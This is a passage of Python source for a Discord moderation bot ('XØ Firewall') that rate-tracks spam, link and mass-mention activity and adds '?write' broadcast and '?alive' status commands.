        prune_alive_timestamps(smart_timestamps, now, 86400)
        smart_timestamps.append(now)

    message_timestamps = alive_secure_message_timestamps.setdefault(user_id, [])
    prune_alive_timestamps(message_timestamps, now, 3)
    message_timestamps.append(now)

    if len(message_timestamps) >= 5:
        alive_secure_message_timestamps.pop(user_id, None)
        alive_counters["secure_actions"] += 1

    if find_smart_dm_trigger(message.content) is not None:
        keyword_timestamps = alive_secure_keyword_timestamps.setdefault(user_id, [])
        prune_alive_timestamps(keyword_timestamps, now, 10)
        keyword_timestamps.append(now)

        if len(keyword_timestamps) > 3:
            alive_secure_keyword_timestamps.pop(user_id, None)
            alive_counters["secure_actions"] += 1

    link_count = len(get_secure_links(message.content))
    if link_count:
        link_timestamps = alive_secure_link_timestamps.setdefault(user_id, [])
        prune_alive_timestamps(link_timestamps, now, 5)
        link_timestamps.extend([now] * link_count)

        if len(link_timestamps) >= 3:
            alive_secure_link_timestamps.pop(user_id, None)
            alive_counters["secure_actions"] += 1

    if "@everyone" in message.content or "@here" in message.content:
        mention_timestamps = alive_secure_mention_timestamps.setdefault(user_id, [])
        prune_alive_timestamps(mention_timestamps, now, 30)

        if not mention_timestamps:
            alive_secure_mention_action_counts.pop(user_id, None)
        mention_timestamps.append(now)

        if len(mention_timestamps) > 1:
            action_count = alive_secure_mention_action_counts.get(user_id, 0) + 1
            alive_secure_mention_action_counts[user_id] = action_count
            alive_counters["secure_actions"] += 1

            if action_count > 1:
                alive_secure_mention_timestamps.pop(user_id, None)
                alive_secure_mention_action_counts.pop(user_id, None)


async def alive_resolve_channel(message, channel_value):
    channel_value = channel_value.strip()
    channel_id = None

    if channel_value.startswith("<#") and channel_value.endswith(">"):
        channel_value = channel_value[2:-1]

    if channel_value.isdigit():
        channel_id = int(channel_value)

    channel = None
    if channel_id is not None:
        channel = bot.get_channel(channel_id)
        if channel is None:
            try:
                channel = await bot.fetch_channel(channel_id)
            except discord.DiscordException:
                return None
    elif message.guild is not None:
        channel_name = channel_value.removeprefix("#").casefold()
        for guild_channel in message.guild.text_channels:
            if guild_channel.name.casefold() == channel_name:
                channel = guild_channel
                break

    if channel is None or getattr(channel, "guild", None) != message.guild:
        return None

    if not hasattr(channel, "send"):
        return None

    return channel


async def alive_handle_broadcast(message):
    command = "?write"
    content = message.content

    if not content.casefold().startswith(command):
        return False

    if len(content) > len(command) and not content[len(command)].isspace():
        return False

    arguments = content[len(command):].lstrip()
    channel_value, separator, broadcast_message = arguments.partition(" ")

    if not separator or not broadcast_message:
        await alive_send_dm(
            message.author,
            "XØ Broadcast Failed\n"
            "Usage: ?write <channel> <message>"
        )
        return True

    channel = await alive_resolve_channel(message, channel_value)
    if channel is None:
        await alive_send_dm(
            message.author,
            "XØ Broadcast Failed\n"
            f"Invalid channel: {channel_value}"
        )
        return True

    try:
        await channel.send(broadcast_message)
    except discord.DiscordException:
        await alive_send_dm(
            message.author,
            "XØ Broadcast Failed\n"
            f"Unable to send to channel: {channel_value}"
        )
        return True

    alive_counters["broadcasts"] += 1
    await alive_send_dm(
        message.author,
        "XØ Broadcast Delivered\n"
        f"Channel: {channel_value}\n"
        f"Message: {broadcast_message}"
    )
    await alive_log(
        "XØ Broadcast Delivered\n"
        f"User: {message.author.name}\n"
        f"Channel: {channel_value}\n"
        f"Message: {broadcast_message}"
    )
    return True


async def alive_handle_ping(message):
    if message.content.strip().casefold() != "?alive":
        return False

    await alive_send_dm(
        message.author,
        "XØ Firewall is online and stable.\n"
        "SMART: Active\n"
        "SECURE: Active\n"
        "ALIVE: Active"
    )
    return True


@bot.listen("on_message")
async def alive_message_listener(message):
    if message.author.bot:
        return

    now = discord.utils.utcnow().timestamp()

    try:
        alive_track_activity(message, now)
    except Exception as error:
        print(f"ALIVE activity tracker failed: {error}")

    try:
        if await alive_handle_broadcast(message):
            return
        await alive_handle_ping(message)
    except Exception as error:
        print(f"ALIVE message handler failed: {error}")


bot.run(TOKEN)
